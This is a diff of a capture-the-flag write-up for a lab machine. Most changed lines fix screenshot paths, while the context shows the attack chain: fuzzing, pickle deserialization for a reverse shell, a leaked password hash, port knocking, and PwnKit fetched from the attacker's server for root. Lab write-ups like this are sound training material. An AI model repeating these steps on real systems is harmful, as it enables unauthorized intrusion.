@@ -62,7 +62,7 @@ Starting with a standard service version scan against the target:
 nmap -sV -v 10.113.131.66
 ```
 
-![Nmap scan results](screenshots/01_nmap_scan.png)
+![Nmap scan results](01_nmap_scan.png)
 
 | Port | State | Service | Version |
 |------|-------|---------|---------|
@@ -80,7 +80,7 @@ nmap -sV -v 10.113.131.66
 
 Navigating to `http://10.113.131.66` reveals a gaming company website called **JACKPIRO**:
 
-![JACKPIRO gaming website](screenshots/02_website_jackpiro.png)
+![JACKPIRO gaming website](02_website_jackpiro.png)
 
 The site advertises an "Amazing 3D Game" with Lorem Ipsum placeholder text. Navigation includes: `GAME`, `SOFTWARE`, `ABOUT`, `TESTIMONIAL`, `CONTACT`, and `Login`/`Signup` buttons. The connection is plain HTTP (no HTTPS).
 
@@ -98,7 +98,7 @@ sudo nano /etc/hosts
 10.113.131.66    incognito dev.incognito.com
 ```
 
-![/etc/hosts with incognito hostname added](screenshots/03_etc_hosts.png)
+![/etc/hosts with incognito hostname added](03_etc_hosts.png)
 
 This allows us to reach the server using hostnames instead of just the raw IP.
 
@@ -115,7 +115,7 @@ ffuf -u http://10.113.131.66/ \
      -fs 20637
 ```
 
-![ffuf virtual host discovery — dev subdomain found](screenshots/04_ffuf_vhost.png)
+![ffuf virtual host discovery — dev subdomain found](04_ffuf_vhost.png)
 
 | Subdomain | Status | Size | Duration |
 |-----------|--------|------|----------|
@@ -135,7 +135,7 @@ ffuf -u http://dev.incognito.com/FUZZ \
      -ic -c
 ```
 
-![ffuf directory fuzzing on dev subdomain](screenshots/05_ffuf_dirs.png)
+![ffuf directory fuzzing on dev subdomain](05_ffuf_dirs.png)
 
 | Path | Status | Size | Notes |
 |------|--------|------|-------|
@@ -153,7 +153,7 @@ The `secret` directory with a 301 redirect is immediately interesting. Following
 
 Navigating to `http://dev.incognito.com/secret/upload/` reveals a minimal file upload form:
 
-![Dev file upload page](screenshots/06_upload_page.png)
+![Dev file upload page](06_upload_page.png)
 
 > **"Upload a File: [Browse...] [Start Upload]"**
 
@@ -173,13 +173,13 @@ We intercept requests with Burp Suite to understand the full upload flow.
 
 **Testing a plain text file upload (`test.txt`):**
 
-![Burp Suite — test.txt upload request and response](screenshots/13_burp_test_upload.png)
+![Burp Suite — test.txt upload request and response](13_burp_test_upload.png)
 
 Response: `The file test.txt has been uploaded` — server accepts any file type, no restrictions.
 
 **Testing the actual shell payload upload:**
 
-![Burp Suite — shell payload upload request/response](screenshots/12_burp_upload_response.png)
+![Burp Suite — shell payload upload request/response](12_burp_upload_response.png)
 
 The Burp request shows the raw multipart form data with our pickle payload. Response confirms: `The file shell has been uploaded`.
 
@@ -187,7 +187,7 @@ The Burp request shows the raw multipart form data with our pickle payload. Resp
 
 While investigating the main application at `http://10.10.162.158`, Burp reveals a `/fetch` endpoint that accepts a JSON body:
 
-![Burp Suite — /fetch endpoint with object path](screenshots/11_burp_fetch_request.png)
+![Burp Suite — /fetch endpoint with object path](11_burp_fetch_request.png)
 
 ```json
 POST /fetch HTTP/1.1
@@ -211,7 +211,7 @@ Python's `pickle` module serializes/deserializes Python objects. When a `pickle`
 
 We first examine a reference implementation of the attack:
 
-![Reference exploit.py from another writeup](screenshots/07_exploit_py_reference.png)
+![Reference exploit.py from another writeup](07_exploit_py_reference.png)
 
 ### Writing Our Exploit
 
@@ -221,7 +221,7 @@ We create `exploit.py` with our own listener IP and port:
 nano exploit.py
 ```
 
-![exploit.py in nano editor](screenshots/08_exploit_py_nano.png)
+![exploit.py in nano editor](08_exploit_py_nano.png)
 
 ```python
 import pickle
@@ -244,7 +244,7 @@ python3 exploit.py
 ls -la
 ```
 
-![Shell binary created — 93 bytes](screenshots/10_shell_binary_created.png)
+![Shell binary created — 93 bytes](10_shell_binary_created.png)
 
 The exploit generates a binary file `shell` (93 bytes) containing our malicious serialized object.
 
@@ -252,7 +252,7 @@ The exploit generates a binary file `shell` (93 bytes) containing our malicious 
 python3 exploit.py && ls -la
 ```
 
-![exploit.py run successfully, shell file confirmed](screenshots/09_exploit_py_saved.png)
+![exploit.py run successfully, shell file confirmed](09_exploit_py_saved.png)
 
 ---
 
@@ -283,7 +283,7 @@ curl -X POST http://10.113.131.66/fetch \
 
 The server reads `/var/upload/shell`, deserializes it with pickle, and our `__reduce__` method fires — sending a reverse shell to our listener:
 
-![Penelope receives reverse shell as www-data](screenshots/15_shell_received.png)
+![Penelope receives reverse shell as www-data](15_shell_received.png)
 
 **Shell obtained:** `www-data@incognito` with PTY upgrade via Python3. We're inside the machine.
 
@@ -302,7 +302,7 @@ chmod +x exp
 ./exp
 ```
 
-![DirtyFrag kernel exploit fails — rc=4](screenshots/16_dirtyfrag_fail.png)
+![DirtyFrag kernel exploit fails — rc=4](16_dirtyfrag_fail.png)
 
 ```
 dirtyfrag: failed (rc=4)
@@ -318,7 +318,7 @@ We investigate why SSH is inaccessible and examine the configuration:
 cat /etc/ssh/sshd_config | grep -i "PasswordAuth\|PermitRoot\|AllowUsers"
 ```
 
-![sshd_config showing PasswordAuthentication yes](screenshots/20_sshd_config.png)
+![sshd_config showing PasswordAuthentication yes](20_sshd_config.png)
 
 Password authentication is enabled but SSH itself is filtered by firewall. Note `www-data` is in group `nosu` which blocks `su` usage.
 
@@ -328,7 +328,7 @@ Password authentication is enabled but SSH itself is filtered by firewall. Note 
 
 Running Linpeas for automated enumeration, it highlights mail files:
 
-![Linpeas output highlighting /var/mail/dev1](screenshots/18_linpeas_mail.png)
+![Linpeas output highlighting /var/mail/dev1](18_linpeas_mail.png)
 
 We check the mail spool directly:
 
@@ -338,7 +338,7 @@ ls -la
 cat dev1
 ```
 
-![/var/mail — cat dev1 reveals password hash](screenshots/17_var_mail_password.png)
+![/var/mail — cat dev1 reveals password hash](17_var_mail_password.png)
 
 Full mail content:
 
@@ -347,7 +347,7 @@ Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
 Knock yourself in!
 ```
 
-![/var/mail cat dev1 — full output](screenshots/19_mail_cat_dev1.png)
+![/var/mail cat dev1 — full output](19_mail_cat_dev1.png)
 
 Two critical pieces of information:
 1. **A hash:** `dc647eb65e6711e155375218212b3964`
@@ -375,7 +375,7 @@ The phrase "Knock yourself in!" is a direct hint at **port knocking** — a meth
 cat /etc/knockd.conf
 ```
 
-![knockd.conf showing port sequence 5020,6120,7340](screenshots/21_knockd_conf.png)
+![knockd.conf showing port sequence 5020,6120,7340](21_knockd_conf.png)
 
 ```ini
 [openSSH]
@@ -459,9 +459,9 @@ cd PwnKit
 python3 -m http.server 8888
 ```
 
-![Cloning PwnKit on Kali and serving via HTTP](screenshots/25_pwnkit_git_clone.png)
+![Cloning PwnKit on Kali and serving via HTTP](25_pwnkit_git_clone.png)
 
-![HTTP server serving PwnKit binary](screenshots/22_pwnkit_download_kali.png)
+![HTTP server serving PwnKit binary](22_pwnkit_download_kali.png)
 
 **On the target — download and execute:**
 
@@ -472,9 +472,9 @@ chmod +x PwnKit
 ./PwnKit
 ```
 
-![PwnKit downloaded successfully on target](screenshots/23_pwnkit_wget_target.png)
+![PwnKit downloaded successfully on target](23_pwnkit_wget_target.png)
 
-![Root shell obtained via PwnKit](screenshots/24_root_shell.png)
+![Root shell obtained via PwnKit](24_root_shell.png)
 
 ```
 uid=0(root) gid=0(root) groups=0(root),...
@@ -492,7 +492,7 @@ ls
 cat root.txt
 ```
 
-![Root flag](screenshots/26_root_flag.png)
+![Root flag](26_root_flag.png)
 
 ---
 
@@ -513,6 +513,7 @@ cat root.txt
 | ffuf | Virtual host & directory fuzzing | https://github.com/ffuf/ffuf |
 | Burp Suite | HTTP traffic interception & analysis | https://portswigger.net/burp |
 | Python (pickle) | Crafting deserialization RCE payload | https://docs.python.org/3/library/pickle.html |
+| curl | File upload & /fetch endpoint trigger | https://curl.se |
 | Penelope | Reverse shell handler with PTY upgrade | https://github.com/brightio/penelope |
 | CrackStation | MD5 hash cracking | https://crackstation.net |
 | knock | Port knocking client | http://www.zeroflux.org/projects/knock |
